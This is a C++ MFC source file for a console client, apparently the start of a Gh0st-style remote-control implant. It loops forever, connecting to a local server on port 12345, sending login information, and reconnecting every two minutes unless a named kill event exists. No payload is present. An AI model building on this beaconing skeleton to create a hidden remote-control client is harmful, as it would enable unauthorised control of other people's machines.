// MyClient.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "MyClient.h"
#include "ClientSocket.h"
#include "macros.h"
#include "login.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// The one and only application object

CWinApp theApp;

using namespace std;

void MyMain();

int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
{
	int nRetCode = 0;

	HMODULE hModule = ::GetModuleHandle(NULL);

	if (hModule != NULL)
	{
		// initialize MFC and print and error on failure
		if (!AfxWinInit(hModule, NULL, ::GetCommandLine(), 0))
		{
			// TODO: change error code to suit your needs
			_tprintf(_T("Fatal Error: MFC initialization failed\n"));
			nRetCode = 1;
		}
		else
		{
			// TODO: code your application's behavior here.
			MyMain();
		}
	}
	else
	{
		// TODO: change error code to suit your needs
		_tprintf(_T("Fatal Error: GetModuleHandle failed\n"));
		nRetCode = 1;
	}

	return nRetCode;
}

enum
{
	NOT_CONNECT, //  还没有连接
	GETLOGINFO_ERROR,
	CONNECT_ERROR,
	HEARTBEATTIMEOUT_ERROR
};


void MyMain(){
	char	*lpszHost = "127.0.0.1";
	DWORD	dwPort = 12345;
	BYTE	bBreakError = NOT_CONNECT; // 断开连接的原因,初始化为还没有连接
	HANDLE	hEvent = NULL;
	CClientSocket socketClient;
	char	strServiceName[256];
	char	strKillEvent[50];

	while (1){
		// 如果不是心跳超时，不用再sleep两分钟
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 2分钟断线重连, 为了尽快响应killevent
			for (int i = 0; i < 2000; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					CloseHandle(hEvent);
					break;
				}
				// 改一下
				Sleep(60);
			}
		}
		DWORD dwTickCount = GetTickCount();
		if (!socketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = CONNECT_ERROR;
			continue;
		}

		// 登录
		DWORD dwExitCode = SOCKET_ERROR;
		sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount);

		system("pause");
		//////////////////////////////////////////////////////////////////////////
		// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
		//for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		//{
		//	Sleep(1000);
		//}
		// 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接
// 		if (!manager.IsActived())
// 			continue;
	}
}